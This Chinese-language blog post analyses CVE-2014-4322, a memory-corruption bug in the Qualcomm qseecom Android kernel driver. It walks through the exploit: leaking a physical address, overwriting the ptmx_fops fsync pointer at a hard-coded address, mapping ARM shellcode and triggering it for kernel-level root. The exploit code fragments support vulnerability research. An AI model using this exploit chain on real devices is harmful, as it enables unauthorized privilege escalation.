<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> CVE-2014-4322-qseecom内存破坏漏洞分析 · Ele7enxxh's Blog</title><meta name="description" content="CVE-2014-4322-qseecom内存破坏漏洞分析 - ele7enxxh"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/favicon.jpg"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="http://fonts.useso.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="http://weibo.com/5545520757" target="_blank" class="nav-list-link">WEIBO</a></li><li class="nav-list-item"><a href="https://github.com/ele7enxxh" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">CVE-2014-4322-qseecom内存破坏漏洞分析</h1><div class="post-info">Jul 26, 2015</div><div class="post-content"><p>本文主要研究了CVE-2014-4322-qseecom内存破坏漏洞的原理与利用。<a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
<p>QSEECOM驱动程序提供了ioctl系统调用接口，用于用户空间客户端的通讯。<br>QSEECOM driver的drivers/misc/qseecom.c没有验证ioctl调用中的某些偏移、长度、基值，攻击者通过构造的应用，利用此漏洞可获取提升的权限或造成拒绝服务。</p>
</blockquote>
<h2 id="分析环境与工具"><a href="#分析环境与工具" class="headerlink" title="分析环境与工具"></a>分析环境与工具</h2><p>Android版本：Android4.4.4_r1<br>内核版本：kernel_msm-android-msm-hammerhead-3.4-kitkat-mr1<br>手机：Nexus5</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>接下来我将结合retme在xkungfoo2015安全会议做出的报告对该漏洞的exploit原理进行详细分析。看一下codeaurora对该漏洞的简介：</p>
<blockquote>
<p>The qseecom driver provides an ioctl system call interface to user space clients for communication. When processing this communication, the __qseecom_update_cmd_buf function uses the user-supplied value cmd_buf_offset as an index to a buffer for write operations without any boundary checks, allowing a local application with access to the qseecom device node to, e.g., escalate privileges.</p>
</blockquote>
<p>显然问题出在__qseecom_update_cmd_buf函数没有对用户传入的参数进行边界检查，导致了内存破坏。对该漏洞的patch时在函数入口添加了一个边界检查的函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">boundary_checks_offset</span><span class="params">(<span class="keyword">struct</span> qseecom_send_modfd_cmd_req *cmd_req,</span><br><span class="line">	<span class="keyword">struct</span> qseecom_send_modfd_listener_resp *lstnr_resp,</span><br><span class="line">	<span class="keyword">struct</span> qseecom_dev_handle *data, <span class="keyword">bool</span> listener_svc,</span><br><span class="line">	<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> ((!listener_svc) &amp;&amp; (cmd_req-&gt;ifd_data[i].fd &gt; <span class="number">0</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (cmd_req-&gt;ifd_data[i].cmd_buf_offset &gt; </span><br><span class="line">			cmd_req-&gt;cmd_req_len - <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>)) &#123;</span><br><span class="line">			pr_err(<span class="string">"Invalid offset 0x%x\n"</span>,</span><br><span class="line">				cmd_req-&gt;ifd_data[i].cmd_buf_offset);</span><br><span class="line">			<span class="keyword">return</span> ++ret;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((listener_svc) &amp;&amp; (lstnr_resp-&gt;ifd_data[i].fd &gt; <span class="number">0</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (lstnr_resp-&gt;ifd_data[i].cmd_buf_offset &gt;</span><br><span class="line">			lstnr_resp-&gt;resp_len - <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>)) &#123;</span><br><span class="line">			pr_err(<span class="string">"Invalid offset 0x%x\n"</span>,</span><br><span class="line">				lstnr_resp-&gt;ifd_data[i].cmd_buf_offset);</span><br><span class="line">			<span class="keyword">return</span> ++ret;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>查看__qseecom_update_cmd_buf函数源码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __qseecom_update_cmd_buf(<span class="keyword">struct</span></span><br><span class="line">qseecom_send_modfd_cmd_req *req,...)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="comment">/* Get the handle of the shared fd */</span></span><br><span class="line">	ihandle = ion_import_dma_buf(qseecom.ion_clnt, req-&gt;ifd_data[i].fd);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR_OR_NULL(ihandle)) &#123;</span><br><span class="line">		pr_err(<span class="string">"Ion client can't retrieve the handle\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line">	field = (<span class="keyword">char</span> *) req-&gt;cmd_req_buf + req-&gt;ifd_data[i].cmd_buf_offset;</span><br><span class="line">	<span class="comment">/* Populate the cmd data structure with the phys_addr */</span></span><br><span class="line">	sg_ptr = ion_sg_table(qseecom.ion_clnt, ihandle);</span><br><span class="line">...</span><br><span class="line">	update = (<span class="keyword">uint32_t</span> *) field;</span><br><span class="line">	<span class="keyword">if</span> (cleanup)</span><br><span class="line">		*update = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		*update = (<span class="keyword">uint32_t</span>)sg_dma_address(sg_ptr-&gt;sgl);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里我隐藏了无关的代码，只贴出了涉及本漏洞的部分。req-&gt;cmd_req_buf为用户态传入的缓冲区基地址，req-&gt;ifd_data[i].cmd_buf_offset为相对于req_buf的偏移，sg_dma_address返回一个物理地址。值得注意的是，req-&gt;cmd_req_buf和req-&gt;ifd_data[i].cmd_buf_offset的值都是用户态传入的，并且没有任何限制。</p>
<p>假定sg_dma_address(sg_ptr-&gt;sgl)返回的是一个固定的物理地址，如0x3*******，我们可以构造出该漏洞的利用思路：</p>
<ol>
<li>构造用户态参数，调用ioctl触发__qseecom_update_cmd_buf函数，将0x3*******泄露回用户态，得到确切地址；</li>
<li>构造用户态参数，再次调用ioctl触发__qseecom_update_cmd_buf函数，覆盖ptmx_fops结构体的fsync函数指针；</li>
<li>在0x3*******地址mmap一段空间，并布置相应的shellcode；</li>
<li>调用fsync(/dev/ptmx)触发内核调用shellcode，完成提权；</li>
</ol>
<p>首先来看如何在用户态触发req-&gt;cmd_req_buf函数，搜索__qseecom_update_cmd_buf：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">qseecom_send_modfd_cmd</span><span class="params">(<span class="keyword">struct</span> qseecom_dev_handle *data,</span><br><span class="line">					<span class="keyword">void</span> __user *argp)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">struct</span> qseecom_send_modfd_cmd_req req;</span><br><span class="line">	<span class="keyword">struct</span> qseecom_send_cmd_req send_cmd_req;</span><br><span class="line">	ret = copy_from_user(&amp;req, argp, <span class="keyword">sizeof</span>(req));</span><br><span class="line">	<span class="keyword">if</span> (ret) &#123;</span><br><span class="line">		pr_err(<span class="string">"copy_from_user failed\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line">	send_cmd_req.cmd_req_buf = req.cmd_req_buf;</span><br><span class="line">	send_cmd_req.cmd_req_len = req.cmd_req_len;</span><br><span class="line">	send_cmd_req.resp_buf = req.resp_buf;</span><br><span class="line">	send_cmd_req.resp_len = req.resp_len;</span><br><span class="line">	ret = __qseecom_update_cmd_buf(&amp;req, <span class="literal">false</span>);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	ret = __qseecom_send_cmd(data, &amp;send_cmd_req);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	ret = __qseecom_update_cmd_buf(&amp;req, <span class="literal">true</span>);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	pr_debug(<span class="string">"sending cmd_req-&gt;rsp size: %u, ptr: 0x%p\n"</span>,</span><br><span class="line">			req.resp_len, req.resp_buf);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>继续找qseecom_send_modfd_cmd的上层调用：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">qseecom_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="keyword">unsigned</span> cmd,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">case</span> QSEECOM_IOCTL_SEND_MODFD_CMD_REQ: &#123;</span><br><span class="line">		<span class="comment">/* Only one client allowed here at a time */</span></span><br><span class="line">		mutex_lock(&amp;app_access_lock);</span><br><span class="line">		atomic_inc(&amp;data-&gt;ioctl_count);</span><br><span class="line">		ret = qseecom_send_modfd_cmd(data, argp);</span><br><span class="line">		atomic_dec(&amp;data-&gt;ioctl_count);</span><br><span class="line">		wake_up_all(&amp;data-&gt;abort_wq);</span><br><span class="line">		mutex_unlock(&amp;app_access_lock);</span><br><span class="line">		<span class="keyword">if</span> (ret)</span><br><span class="line">			pr_err(<span class="string">"failed qseecom_send_cmd: %d\n"</span>, ret);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>到这里就可以知道，命令码为QSEECOM_IOCTL_SEND_MODFD_CMD_REQ的ioctl函数调用，就可以触发qseecom驱动层__qseecom_update_cmd_buf函数。<br>让我们考虑如何构造用户态参数的问题，先贴出要用到的结构体：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> * struct qseecom_ion_fd_info - ion fd handle data information</span><br><span class="line"> * @fd - ion handle to some memory allocated in user space</span><br><span class="line"> * @cmd_buf_offset - command buffer offset</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">struct</span> qseecom_ion_fd_info &#123;</span><br><span class="line">	<span class="keyword">int32_t</span> fd;</span><br><span class="line">	<span class="keyword">uint32_t</span> cmd_buf_offset;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*</span><br><span class="line"> * struct qseecom_send_modfd_cmd_req - for send command ioctl request</span><br><span class="line"> * @cmd_req_len - command buffer length</span><br><span class="line"> * @cmd_req_buf - command buffer</span><br><span class="line"> * @resp_len - response buffer length</span><br><span class="line"> * @resp_buf - response buffer</span><br><span class="line"> * @ifd_data_fd - ion handle to memory allocated in user space</span><br><span class="line"> * @cmd_buf_offset - command buffer offset</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">struct</span> qseecom_send_modfd_cmd_req &#123;</span><br><span class="line">	<span class="keyword">void</span> *cmd_req_buf; <span class="comment">/* in */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> cmd_req_len; <span class="comment">/* in */</span></span><br><span class="line">	<span class="keyword">void</span> *resp_buf; <span class="comment">/* in/out */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> resp_len; <span class="comment">/* in/out */</span></span><br><span class="line">	<span class="keyword">struct</span> qseecom_ion_fd_info ifd_data[MAX_ION_FD];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>回到__qseecom_update_cmd_buf函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __qseecom_update_cmd_buf(<span class="keyword">struct</span></span><br><span class="line">qseecom_send_modfd_cmd_req *req,...)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="comment">/* Get the handle of the shared fd */</span></span><br><span class="line">	ihandle = ion_import_dma_buf(qseecom.ion_clnt, req-&gt;ifd_data[i].fd);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR_OR_NULL(ihandle)) &#123;</span><br><span class="line">		pr_err(<span class="string">"Ion client can't retrieve the handle\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>要继续触发后面的逻辑，我们需要构造req-&gt;ifd_data[i].fd参数，以保证ihandle的值不为空。根据上面结构体qseecom_ion_fd_info的注释，需要分配一个ion内存管理器的句柄，通过网上资料的查询，代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetIonSharedFd</span><span class="params">(<span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd;</span><br><span class="line">	<span class="keyword">struct</span> ion_allocation_data allocation_data;</span><br><span class="line">	<span class="keyword">struct</span> ion_fd_data fd_data;</span><br><span class="line"></span><br><span class="line">	fd = open(<span class="string">"/dev/ion"</span>, O_RDONLY);</span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">"open /dev/ion"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	allocation_data.len = length;</span><br><span class="line">	allocation_data.align = length;</span><br><span class="line">	allocation_data.flags = ION_HEAP_TYPE_CARVEOUT;</span><br><span class="line">	<span class="keyword">if</span> (ioctl(fd, ION_IOC_ALLOC, &amp;allocation_data) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">"ION_IOC_ALLOC"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fd_data.handle = allocation_data.handle;</span><br><span class="line">	<span class="keyword">if</span> (ioctl(fd, ION_IOC_SHARE, &amp;fd_data) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">"ION_IOC_SHARE"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> fd_data.fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>所以ifd_data_fd构造如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> qseecom_send_modfd_cmd_req send_modfd_cmd_req;</span><br><span class="line">send_modfd_cmd_req.ifd_data[<span class="number">0</span>].fd = GetIonSharedFd(<span class="number">8192</span>);</span><br></pre></td></tr></table></figure></p>
<p>接着往下看__qseecom_update_cmd_buf函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">field = (<span class="keyword">char</span> *) req-&gt;cmd_req_buf + req-&gt;ifd_data[i].cmd_buf_offset;</span><br></pre></td></tr></table></figure></p>
<p>首先需要将物理地址泄露回用户态，参数构造如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *abuse_buff;</span><br><span class="line">abuse_buff = <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line"><span class="built_in">memset</span>(abuse_buff, <span class="number">0</span>, <span class="number">400</span>);</span><br><span class="line">send_modfd_cmd_req.cmd_req_buf = abuse_buff;</span><br><span class="line">send_modfd_cmd_req.ifd_data[<span class="number">0</span>].cmd_buf_offset = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p>
<p>接着通过ioctl触发__qseecom_update_cmd_buf函数调用：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">field = (<span class="keyword">char</span> *) req-&gt;cmd_req_buf + req-&gt;ifd_data[i].cmd_buf_offset;</span><br><span class="line">      = (<span class="keyword">char</span> *) abuse_buff;</span><br><span class="line">update = (<span class="keyword">uint32_t</span> *) field;</span><br><span class="line">       = (<span class="keyword">uint32_t</span> *) abuse_buff;</span><br><span class="line">*update = (<span class="keyword">uint32_t</span>) sg_dma_addressji(sg_ptr-&gt;sgl); -&gt; ((<span class="keyword">uint32_t</span> *) abuse_buff)[<span class="number">0</span>] = (<span class="keyword">uint32_t</span>) sg_dma_addressji(sg_ptr-&gt;sgl);</span><br></pre></td></tr></table></figure></p>
<p>即abuse_buff[0]存放了内核态泄露出的物理地址0x3*******。接下来构造参数以覆盖fsync函数指针：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTMX_FOPS 0xc1235dd0 <span class="comment">// 此处是ptmx_fops结构体的地址的硬编码</span></span></span><br><span class="line">send_modfd_cmd_req.ifd_data[<span class="number">0</span>].cmd_buf_offset = PTMX_FOPS + <span class="number">56</span> - (<span class="keyword">int</span>) abuse_buff; <span class="comment">// PTMX_FOPS + 56 的地址即为fsync</span></span><br></pre></td></tr></table></figure></p>
<p>继续通过ioctl触发__qseecom_update_cmd_buf函数调用：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">field = (<span class="keyword">char</span> *) req-&gt;cmd_req_buf + req-&gt;ifd_data[i].cmd_buf_offset;</span><br><span class="line">      = (<span class="keyword">char</span> *) (PTMX_FOPS + <span class="number">56</span>);</span><br><span class="line">update = (<span class="keyword">uint32_t</span> *) field;</span><br><span class="line">       = (<span class="keyword">uint32_t</span> *) (PTMX_FOPS + <span class="number">56</span>);</span><br><span class="line">*update = (<span class="keyword">uint32_t</span>) sg_dma_addressji(sg_ptr-&gt;sgl); -&gt; *((<span class="keyword">uint32_t</span> *) PTMX_FOPS + <span class="number">56</span>) = (<span class="keyword">uint32_t</span>) sg_dma_addressji(sg_ptr-&gt;sgl);</span><br></pre></td></tr></table></figure></p>
<p>这样fsync函数指针地址即被替换为了0x3*******，我们只需要在0x3*******地址布置shellcode即可：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> shellcode[] = &#123;<span class="number">0xe59f0004</span>, <span class="number">0xe92d0001</span>, <span class="number">0xe8bd8000</span>&#125;; <span class="comment">// ldr r0, [pc, $4], stmfd sp!, &#123;r0&#125;, ldmfd sp!, &#123;pc&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>这里注意的是我们不能使用b系列的跳转指令，因为b系列指令是基于PC的相对偏移的。<br>最后访问/dev/ptmx，调用sync，shellcode将以内核权限执行，执行提权代码后，完成root。</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>qseecom设备需要system权限才能访问，所以我们首先需要提权到system才能利用该漏洞，比如CVE-2014-7911。<br>retme大神早就提供了POC，这篇博客也是分析了retme的POC和报告才有的。我在retme的POC的基础上精简了一些代码，需要的和我联系。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol>
<li><a href="https://github.com/retme7/CVE-2014-4322_poc" target="_blank" rel="external">https://github.com/retme7/CVE-2014-4322_poc</a></li>
<li><a href="https://github.com/android/kernel_msm/tree/android-msm-hammerhead-3.4-kitkat-mr1" target="_blank" rel="external">https://github.com/android/kernel_msm/tree/android-msm-hammerhead-3.4-kitkat-mr1</a></li>
<li><a href="https://github.com/android-rooting-tools/android_run_root_shell" target="_blank" rel="external">https://github.com/android-rooting-tools/android_run_root_shell</a></li>
</ol>
</div></article></div></section><footer><div class="paginator"><a href="/Mtkfb-Exploit.html" class="prev">PREV</a><a href="/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability.html" class="next">NEXT</a></div><div id="disqus_thread"></div><script>var disqus_shortname = 'ele7enxxh';
var disqus_identifier = 'Memory-Corruption-Qseecom-Driver-CVE-2014-4322-Analysis.html';
var disqus_title = 'CVE-2014-4322-qseecom内存破坏漏洞分析';
var disqus_url = 'http://ele7enxxh.com/Memory-Corruption-Qseecom-Driver-CVE-2014-4322-Analysis.html';
(function() {
    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();</script><script id="dsq-count-scr" src="//ele7enxxh.disqus.com/count.js" async></script><div class="copyright"><p>© 2015 - 2016 <a href="http://ele7enxxh.com">ele7enxxh</a>, unless otherwise noted.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>